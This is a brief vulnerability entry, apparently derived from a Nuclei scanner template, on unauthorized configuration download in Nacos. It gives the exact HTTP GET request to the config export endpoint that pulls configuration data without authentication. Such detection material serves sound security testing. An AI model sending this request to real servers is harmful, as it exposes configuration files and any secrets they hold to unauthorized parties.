# Vulnerability: Nacos - Information Disclosure
**Classification:** NACOS
**Source:** Nuclei Template (`nacos-info-leak.yaml`)

## Description
Nacos unauthorized download of configuration information.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId=
```

